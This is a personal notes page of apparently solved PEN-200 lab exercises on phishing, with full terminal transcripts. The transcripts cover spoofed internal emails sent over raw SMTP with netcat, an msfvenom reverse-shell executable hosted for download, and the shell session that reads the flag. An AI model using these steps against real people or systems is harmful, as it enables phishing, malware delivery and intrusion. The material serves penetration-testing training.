---
id: offsec labs
tags: [offsec, labs]
created: 2023-01-27
---
# offsec labs

backlinks: [[snippets-bash]]

sources:

---

## PEN-200: 13.3.7 Evading protected view

 Exercises

(To be performed on your own Kali and Windows lab client machines)

1. Trigger the protection by Protected View by simulating a download of the Microsoft Word document from the Internet.
2. Reuse the batch file and embed it in a Microsoft Publisher document to receive a reverse shell to your Kali system.
3. Move the file to the Apache web server to simulate the download of the Publisher document from the Internet and confirm the missing Protected View.

(To be performed with the Topic Exercises VMs under “Resources”)

4. On the target VM #1 enumerate the victim's company website and identify the person working in HR. The objective of this challenge is to mount a social engineering attack against HR. The victim machine is running an SMTP server that can be used to send company emails. The SMTP server allows anonymous logins. Research how to interact with the SMTP server using Netcat. Then, send a phishing email to the HR employee that contains keywords "job application". Include a link to the attacker's web server in the email body. Once the victim clicks on the malicious link, capture the browser's user-agent string. The flag is contained within the user-agent string.

```



helo
250 VICTIM Hello [192.168.119.125]
MAIL FROM: olynch@victim
250 2.1.0 olynch@victim....Sender OK
RCPT TO :lhale@victim
250 2.1.5 lhale@victim 
DATA
354 Start mail input; end with <CRLF>.<CRLF>

From: olynch@victim
To: lhale@victim
Subject: job application

job application
http://192.168.119.125:80

.
250 2.6.0 <VICTIMZS2TRqf69aZbL00000005@VICTIM> Queued mail for delivery


─$ nc -nlvp 80     
listening on [any] 80 ...
connect to [192.168.119.125] from (UNKNOWN) [192.168.125.55] 49711
GET / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko; OS{5343624da184f77c2dc62115bb2f1f22}
Host: 192.168.119.125
Accept-Encoding: gzip
Connection: Keep-Alive






```

1. On the target VM #2 enumerate the victim's company website and identify employees working in IT and Sales departments. The objective of this challenge is to mount a social engineering attack against the person in sales. The victim machine is running an SMTP server that can be used to send company emails. The SMTP server allows anonymous logins. Research how to interact with the SMTP server using Netcat. Then, send a phishing email from the IT person to the employee in sales that contains keywords "urgent" and "patch". Create and host a Windows PE payload (.exe executable) and include a link to it in the email body. If your email is sent as instructed, the victim user will open it, click on the link, download the malicious executable, and run it. Once you have obtained a reverse shell, retrieve the flag located on the Administrator user's desktop.

```
#create the reverse shell windows pe payload with msfvenom

msfvenom -p windows/shell_reverse_tcp lhost=192.168.119.125 lport=5555 -f exe > ncshell.exe

#host the reverse shell exe
└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...


#set up listener
└─$ nc -nlvp 5555
listening on [any] 5555 ...

#send email to victim via nc 
└─$ nc -Cvv $IP 25
192.168.125.55: inverse host lookup failed: Host name lookup failure
(UNKNOWN) [192.168.125.55] 25 (smtp) open
220 VICTIM Microsoft ESMTP MAIL Service, Version: 10.0.17763.1697 ready at  Sun, 5 Mar 2023 20:51:47 -0500 
helo
250 VICTIM Hello [192.168.119.125]
MAIL FROM: rmurray@victim
RCPT TO :tharper@victim250 2.1.0 rmurray@victim....Sender OK

250 2.1.5 tharper@victim 
DATA
354 Start mail input; end with <CRLF>.<CRLF>

From: rmurray@victim
To: tharper@victim
Subject: urgent patch

urgent patch
http://192.168.119.125:80/ncshell.exe


#python host shows download
192.168.125.55 - - [06/Mar/2023 11:53:25] "GET /ncshell.exe HTTP/1.1" 200 -

#netcat listener gets hit

└─$ nc -nlvp 5555
listening on [any] 5555 ...
connect to [192.168.119.125] from (UNKNOWN) [192.168.125.55] 49709
Microsoft Windows [Version 10.0.17763.2366]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd c:\users
cd c:\users

c:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 8EC2-836F

 Directory of c:\Users

10/14/2021  02:48 PM    <DIR>          .
10/14/2021  02:48 PM    <DIR>          ..
10/14/2021  02:48 PM    <DIR>          .NET v4.5
10/14/2021  02:48 PM    <DIR>          .NET v4.5 Classic
10/14/2021  02:50 PM    <DIR>          Administrator
10/14/2021  02:26 PM    <DIR>          lhale
10/14/2021  02:27 PM    <DIR>          olynch
10/04/2021  08:08 PM    <DIR>          Public
10/14/2021  02:28 PM    <DIR>          rmurray
10/14/2021  02:28 PM    <DIR>          tharper
               0 File(s)              0 bytes
              10 Dir(s)  14,983,974,912 bytes free

c:\Users>cd Administrator
cd Administrator

c:\Users\Administrator>cd Desktop 
cd Desktop

c:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 8EC2-836F

 Directory of c:\Users\Administrator\Desktop

12/21/2021  12:33 PM    <DIR>          .
12/21/2021  12:33 PM    <DIR>          ..
03/05/2023  08:44 PM                78 flag.txt
               1 File(s)             78 bytes
               2 Dir(s)  14,969,544,704 bytes free

c:\Users\Administrator\Desktop>type flag.txt
type flag.txt
OS{307988a3954fcd3ab2491f4537d06fd7}



```